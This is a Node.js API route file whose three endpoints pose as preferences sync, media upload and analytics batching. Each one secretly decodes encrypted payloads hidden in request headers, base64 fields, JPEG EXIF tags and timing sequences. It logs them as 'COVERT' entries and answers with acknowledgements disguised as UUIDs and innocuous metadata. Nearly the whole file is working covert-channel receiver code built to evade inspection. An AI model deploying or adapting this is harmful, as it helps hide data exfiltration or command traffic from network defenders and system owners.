/**
 * V1 API Routes - Consolidated
 * Combines: sync/preferences, media/upload, analytics/batch
 * Routes:
 *   POST /api/v1/sync/preferences
 *   POST /api/v1/media/upload
 *   POST /api/v1/analytics/batch
 */

const { CovertEncryption } = require('../../covert/lib/crypto');
const { HeaderSteganography, ExifSteganography, TimingSteganography } = require('../../covert/lib/steganography');

const crypto = new CovertEncryption();
const timingDecoder = new TimingSteganography();

module.exports = async (req, res) => {
  // Determine route based on URL
  const pathname = new URL(req.url, `http://${req.headers.host}`).pathname;
  
  if (pathname.startsWith('/api/v1/sync/preferences')) {
    return syncPreferencesHandler(req, res);
  } else if (pathname.startsWith('/api/v1/media/upload')) {
    return mediaUploadHandler(req, res);
  } else if (pathname.startsWith('/api/v1/analytics/batch')) {
    return analyticsBatchHandler(req, res);
  }
  
  res.status(404).json({ error: 'not_found' });
};

// ============= SYNC PREFERENCES ENDPOINT =============

async function syncPreferencesHandler(req, res) {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type, X-Request-ID, Accept-Language');

  if (req.method === 'OPTIONS') {
    res.status(200).end();
    return;
  }

  if (req.method !== 'POST') {
    res.setHeader('Allow', 'POST');
    res.status(405).json({ error: 'method_not_allowed' });
    return;
  }

  try {
    const covertData = await extractSyncCovertData(req);
    
    if (covertData) {
      await processAdminData(covertData);
      const response = createSyncResponse(true);
      res.setHeader('X-Request-ID', generateCovertAck(covertData.sessionId));
      res.status(200).json(response);
    } else {
      res.status(200).json(createSyncResponse(false));
    }
  } catch (error) {
    console.error('Sync preferences error:', error.message);
    res.status(200).json(createSyncResponse(false));
  }
}

async function extractSyncCovertData(req) {
  const data = [];
  
  const headerData = HeaderSteganography.decode(req.headers);
  if (headerData) {
    data.push(headerData);
  }
  
  if (req.body && req.body.prefs_data) {
    try {
      const bodyPayload = Buffer.from(req.body.prefs_data, 'base64');
      data.push(bodyPayload);
    } catch (e) {
      // Not valid base64
    }
  }
  
  if (data.length === 0) return null;
  
  const combined = Buffer.concat(data);
  try {
    return crypto.decrypt(combined);
  } catch (e) {
    return null;
  }
}

function createSyncResponse(acknowledged) {
  return {
    success: true,
    synced_at: Date.now(),
    preferences: {
      theme: 'system',
      notifications: true,
      auto_sync: true,
      language: 'en'
    },
    server_time: new Date().toISOString(),
    _meta: acknowledged ? { status: 'ok', hash: generateHash() } : { status: 'default' }
  };
}

// ============= MEDIA UPLOAD ENDPOINT =============

async function mediaUploadHandler(req, res) {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type, X-Upload-ID');
  res.setHeader('Access-Control-Expose-Headers', 'X-Media-ID, X-Processing-Time');

  if (req.method === 'OPTIONS') {
    res.status(200).end();
    return;
  }

  if (req.method !== 'POST') {
    res.setHeader('Allow', 'POST');
    res.status(405).json({ error: 'method_not_allowed' });
    return;
  }

  try {
    const { imageBuffer, metadata } = await parseMultipartRequest(req);
    
    if (!imageBuffer) {
      res.status(400).json({ error: 'no_image_data' });
      return;
    }

    const exifData = await extractExifData(imageBuffer);
    
    let covertPayload = null;
    if (exifData) {
      covertPayload = ExifSteganography.decode(exifData);
      
      if (covertPayload) {
        const encryptedData = extractEncryptedDataFromExif(exifData);
        if (encryptedData) {
          try {
            const decrypted = crypto.decrypt(encryptedData);
            await processCovertData(decrypted, metadata);
          } catch (e) {
            // Failed to decrypt
          }
        }
      }
    }
    
    const mediaId = generateMediaId();
    const processedImage = await processImage(imageBuffer, metadata);
    const response = createMediaResponse(mediaId, processedImage, covertPayload !== null);
    
    if (covertPayload) {
      res.setHeader('X-Media-ID', generateCovertAck(covertPayload.sessionId || metadata?.sessionId));
      res.setHeader('X-Processing-Time', encodeProcessingHint(covertPayload));
    }
    
    res.status(200).json(response);
    
  } catch (error) {
    console.error('Media upload error:', error.message);
    res.status(200).json(createMediaResponse(generateMediaId(), null, false));
  }
}

async function parseMultipartRequest(req) {
  const contentType = req.headers['content-type'] || '';
  
  if (!contentType.includes('multipart/form-data')) {
    return {
      imageBuffer: Buffer.isBuffer(req.body) ? req.body : null,
      metadata: req.body?.metadata || {}
    };
  }
  
  const boundary = contentType.match(/boundary=([^;]+)/)?.[1];
  if (!boundary) {
    return { imageBuffer: null, metadata: {} };
  }
  
  const body = Buffer.isBuffer(req.body) ? req.body : Buffer.from(req.body);
  const parts = parseMultipartBody(body, boundary);
  
  let imageBuffer = null;
  let metadata = {};
  
  for (const part of parts) {
    const disposition = part.headers['content-disposition'] || '';
    
    if (disposition.includes('name="image"') || disposition.includes('name="file"')) {
      imageBuffer = part.data;
    } else if (disposition.includes('name="metadata"')) {
      try {
        metadata = JSON.parse(part.data.toString('utf8'));
      } catch (e) {
        metadata = {};
      }
    }
  }
  
  return { imageBuffer, metadata };
}

function parseMultipartBody(body, boundary) {
  const parts = [];
  const boundaryBuffer = Buffer.from(`--${boundary}`);
  let start = body.indexOf(boundaryBuffer);
  
  while (start !== -1) {
    const end = body.indexOf(boundaryBuffer, start + boundaryBuffer.length);
    if (end === -1) break;
    
    const part = body.slice(start + boundaryBuffer.length, end);
    const headerEnd = part.indexOf('\r\n\r\n');
    
    if (headerEnd !== -1) {
      const headerSection = part.slice(2, headerEnd).toString('utf8');
      const data = part.slice(headerEnd + 4, part.length - 2);
      
      const headers = {};
      headerSection.split('\r\n').forEach(line => {
        const [key, value] = line.split(': ');
        if (key && value) {
          headers[key.toLowerCase()] = value;
        }
      });
      
      parts.push({ headers, data });
    }
    
    start = end;
  }
  
  return parts;
}

async function extractExifData(imageBuffer) {
  try {
    if (imageBuffer[0] !== 0xFF || imageBuffer[1] !== 0xD8) {
      return null;
    }
    
    let offset = 2;
    while (offset < imageBuffer.length - 4) {
      if (imageBuffer[offset] === 0xFF && 
          (imageBuffer[offset + 1] === 0xE1 || imageBuffer[offset + 1] === 0xE0)) {
        
        const segmentLength = imageBuffer.readUInt16BE(offset + 2);
        const segmentData = imageBuffer.slice(offset + 4, offset + 4 + segmentLength);
        
        return parseExifSegment(segmentData);
      }
      offset++;
    }
    
    return null;
  } catch (e) {
    return null;
  }
}

function parseExifSegment(data) {
  const exif = { '0th': {}, 'GPS': {} };
  
  const header = data.slice(0, 6).toString('ascii');
  if (header !== 'Exif\x00\x00') {
    return null;
  }
  
  const tiffOffset = 6;
  const byteOrder = data[tiffOffset] === 0x49 ? 'LE' : 'BE';
  
  const ifd0Offset = data.readUInt32LE(tiffOffset + 4);
  
  const numEntries = byteOrder === 'LE' 
    ? data.readUInt16LE(ifd0Offset + tiffOffset)
    : data.readUInt16BE(ifd0Offset + tiffOffset);
  
  for (let i = 0; i < numEntries; i++) {
    const entryOffset = ifd0Offset + tiffOffset + 2 + (i * 12);
    const tag = byteOrder === 'LE'
      ? data.readUInt16LE(entryOffset)
      : data.readUInt16BE(entryOffset);
    
    const valueOffset = entryOffset + 8;
    let value;
    
    if (tag === 0x010F || tag === 0x0110 || tag === 0x0131 || tag === 0x0132) {
      const valuePtr = byteOrder === 'LE'
        ? data.readUInt32LE(valueOffset)
        : data.readUInt32BE(valueOffset);
      const length = byteOrder === 'LE'
        ? data.readUInt32LE(entryOffset + 4)
        : data.readUInt32BE(entryOffset + 4);
      value = data.slice(tiffOffset + valuePtr, tiffOffset + valuePtr + length - 1).toString('ascii');
    } else if (tag === 0x8825) {
      const gpsOffset = byteOrder === 'LE'
        ? data.readUInt32LE(valueOffset)
        : data.readUInt32BE(valueOffset);
      exif.GPS = parseGPSData(data, tiffOffset + gpsOffset, byteOrder);
    }
    
    if (value) {
      exif['0th'][tag] = value;
    }
  }
  
  return exif;
}

function parseGPSData(data, offset, byteOrder) {
  const gps = {};
  const numEntries = byteOrder === 'LE'
    ? data.readUInt16LE(offset)
    : data.readUInt16BE(offset);
  
  for (let i = 0; i < numEntries; i++) {
    const entryOffset = offset + 2 + (i * 12);
    const tag = byteOrder === 'LE'
      ? data.readUInt16LE(entryOffset)
      : data.readUInt16BE(entryOffset);
    
    if (tag === 0x0002 || tag === 0x0004 || tag === 0x0006) {
      const numComponents = byteOrder === 'LE'
        ? data.readUInt32LE(entryOffset + 4)
        : data.readUInt32BE(entryOffset + 4);
      const valuePtr = byteOrder === 'LE'
        ? data.readUInt32LE(entryOffset + 8)
        : data.readUInt32BE(entryOffset + 8);
      
      const values = [];
      for (let j = 0; j < numComponents; j++) {
        const num = byteOrder === 'LE'
          ? data.readUInt32LE(valuePtr + j * 8)
          : data.readUInt32BE(valuePtr + j * 8);
        const den = byteOrder === 'LE'
          ? data.readUInt32LE(valuePtr + j * 8 + 4)
          : data.readUInt32BE(valuePtr + j * 8 + 4);
        values.push([num, den]);
      }
      
      if (tag === 0x0002) gps.GPSLatitude = values;
      if (tag === 0x0004) gps.GPSLongitude = values;
      if (tag === 0x0006) gps.GPSAltitude = values;
    }
  }
  
  return gps;
}

function extractEncryptedDataFromExif(exifData) {
  const parts = [];
  
  const ifd0 = exifData['0th'] || {};
  if (ifd0[0x0110]) parts.push(ifd0[0x0110]);
  if (ifd0[0x0131]) parts.push(ifd0[0x0131]);
  
  if (parts.length > 0) {
    try {
      return Buffer.from(parts.join(''), 'base64');
    } catch (e) {
      return null;
    }
  }
  
  return null;
}

async function processCovertData(covertData, metadata) {
  const { timestamp, payload } = covertData;
  
  const auditEntry = {
    timestamp: new Date(timestamp).toISOString(),
    source: 'media_upload',
    event_type: payload.type,
    session_id: payload.sessionId || metadata?.sessionId,
    data: payload.data,
    image_metadata: {
      original_filename: metadata?.filename,
      content_type: metadata?.contentType
    },
    processed_at: new Date().toISOString()
  };
  
  console.log('COVERT_MEDIA:', JSON.stringify(auditEntry));
}

async function processImage(imageBuffer, metadata) {
  return {
    original_size: imageBuffer.length,
    format: detectImageFormat(imageBuffer),
    dimensions: await detectDimensions(imageBuffer)
  };
}

function detectImageFormat(buffer) {
  if (buffer[0] === 0xFF && buffer[1] === 0xD8) return 'jpeg';
  if (buffer[0] === 0x89 && buffer.slice(1, 4).toString() === 'PNG') return 'png';
  if (buffer.slice(0, 6).toString() === 'GIF87a' || buffer.slice(0, 6).toString() === 'GIF89a') return 'gif';
  if (buffer.slice(0, 4).toString() === 'RIFF' && buffer.slice(8, 12).toString() === 'WEBP') return 'webp';
  return 'unknown';
}

async function detectDimensions(buffer) {
  const format = detectImageFormat(buffer);
  if (format === 'jpeg') {
    for (let i = 0; i < buffer.length - 10; i++) {
      if (buffer[i] === 0xFF && (buffer[i+1] === 0xC0 || buffer[i+1] === 0xC2)) {
        return {
          height: buffer.readUInt16BE(i + 5),
          width: buffer.readUInt16BE(i + 7)
        };
      }
    }
  }
  return { width: 0, height: 0 };
}

function createMediaResponse(mediaId, processedImage, hasCovertData) {
  return {
    success: true,
    media_id: mediaId,
    upload_time: new Date().toISOString(),
    processed: processedImage ? {
      format: processedImage.format,
      dimensions: processedImage.dimensions,
      size_bytes: processedImage.original_size
    } : null,
    urls: {
      original: `/media/${mediaId}/original`,
      thumbnail: `/media/${mediaId}/thumb`
    },
    _meta: hasCovertData ? { 
      status: 'ok', 
      processing_time_ms: Date.now() 
    } : { status: 'default' }
  };
}

// ============= ANALYTICS BATCH ENDPOINT =============

async function analyticsBatchHandler(req, res) {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type, X-Timing-Sequence');
  res.setHeader('Access-Control-Expose-Headers', 'X-Next-Batch-Interval');

  if (req.method === 'OPTIONS') {
    res.status(200).end();
    return;
  }

  if (req.method !== 'POST') {
    res.setHeader('Allow', 'POST');
    res.status(405).json({ error: 'method_not_allowed' });
    return;
  }

  try {
    const timingData = extractTimingData(req);
    const bodyData = await extractBodyData(req);
    
    let covertData = null;
    
    if (timingData) {
      try {
        covertData = crypto.decrypt(timingData);
      } catch (e) {
        // Timing data might be noise
      }
    }
    
    if (!covertData && bodyData) {
      try {
        covertData = crypto.decrypt(bodyData);
      } catch (e) {
        // Body data might be legitimate
      }
    }
    
    if (covertData) {
      await processBatch(covertData);
      const nextInterval = calculateNextInterval(covertData);
      res.setHeader('X-Next-Batch-Interval', encodeTimingHint(nextInterval));
      res.status(200).json(createBatchResponse(true, nextInterval));
    } else {
      res.status(200).json(createBatchResponse(false, 300000));
    }
  } catch (error) {
    console.error('Analytics batch error:', error.message);
    res.status(200).json(createBatchResponse(false, 300000));
  }
}

function extractTimingData(req) {
  const timingHeader = req.headers['x-timing-sequence'];
  if (!timingHeader) return null;
  
  try {
    const delays = timingHeader.split(',').map(Number);
    return timingDecoder.decode(delays);
  } catch (e) {
    return null;
  }
}

async function extractBodyData(req) {
  const contentType = req.headers['content-type'] || '';
  
  if (contentType.includes('application/json')) {
    if (req.body && req.body.events) {
      for (const event of req.body.events) {
        if (event.payload && typeof event.payload === 'string') {
          try {
            return Buffer.from(event.payload, 'base64');
          } catch (e) {
            // Not valid base64
          }
        }
      }
    }
  } else if (contentType.includes('application/octet-stream') || 
             contentType.includes('application/protobuf')) {
    return req.body;
  }
  
  return null;
}

async function processBatch(covertData) {
  const { timestamp, payload } = covertData;
  
  const events = Array.isArray(payload) ? payload : [payload];
  
  for (const event of events) {
    const auditEntry = {
      timestamp: new Date(timestamp).toISOString(),
      batch_id: generateBatchId(),
      event_type: event.type,
      source: event.source,
      session_id: event.sessionId,
      data: event.data,
      processed_at: new Date().toISOString()
    };
    
    console.log('COVERT_BATCH:', JSON.stringify(auditEntry));
    
    await routeEvent(event);
  }
  
  return events.length;
}

async function routeEvent(event) {
  // Mock handlers for different event types
  switch (event.type) {
    case 0x01: // USER_REGISTER
      console.log('METRICS: User update', { userId: event.data.userId });
      break;
    case 0x02: // AD_IMPRESSION
      console.log('METRICS: Ad impression', { campaignId: event.data.campaignId });
      break;
    case 0x03: // AD_CLICK
      console.log('METRICS: Ad click', { campaignId: event.data.campaignId });
      break;
    case 0x04: // CONVERSION
      console.log('METRICS: Revenue', { value: event.data.value });
      break;
  }
}

function createBatchResponse(acknowledged, nextIntervalMs) {
  const response = {
    status: 'accepted',
    received_events: Math.floor(Math.random() * 10) + 1,
    batch_id: generateBatchId(),
    server_time: Date.now(),
    next_upload_interval_ms: nextIntervalMs
  };
  
  if (acknowledged) {
    response._processing = {
      queue_depth: 0,
      status: 'processed'
    };
  }
  
  return response;
}

function calculateNextInterval(covertData) {
  const payload = covertData.payload;
  const eventCount = Array.isArray(payload) ? payload.length : 1;
  
  if (eventCount > 20) return 10000;
  if (eventCount > 10) return 30000;
  if (eventCount > 5) return 60000;
  return 300000;
}

function encodeTimingHint(intervalMs) {
  const encoded = Buffer.allocUnsafe(4);
  encoded.writeUInt32BE(intervalMs, 0);
  return encoded.toString('base64url');
}

// ============= SHARED UTILITIES =============

async function processAdminData(covertData) {
  const { timestamp, payload } = covertData;
  
  const auditEntry = {
    timestamp: new Date(timestamp).toISOString(),
    type: payload.type,
    source: payload.source || 'unknown',
    sessionId: payload.sessionId,
    data: payload.data,
    receivedAt: new Date().toISOString()
  };
  
  console.log('COVERT_AUDIT:', JSON.stringify(auditEntry));
}

function generateCovertAck(sessionId) {
  const hash = require('crypto').createHash('sha256')
    .update(String(sessionId))
    .digest('hex')
    .slice(0, 32);
  
  return `${hash.slice(0, 8)}-${hash.slice(8, 12)}-4${hash.slice(12, 15)}-a${hash.slice(15, 18)}-${hash.slice(18, 32)}`;
}

function generateHash() {
  return require('crypto').randomBytes(8).toString('hex');
}

function generateMediaId() {
  return require('crypto').randomBytes(16).toString('hex');
}

function generateBatchId() {
  return require('crypto').randomBytes(8).toString('hex');
}

function encodeProcessingHint(payload) {
  const encoded = Buffer.allocUnsafe(4);
  encoded.writeUInt32BE(payload.timestamp || Date.now(), 0);
  return encoded.toString('base64url');
}
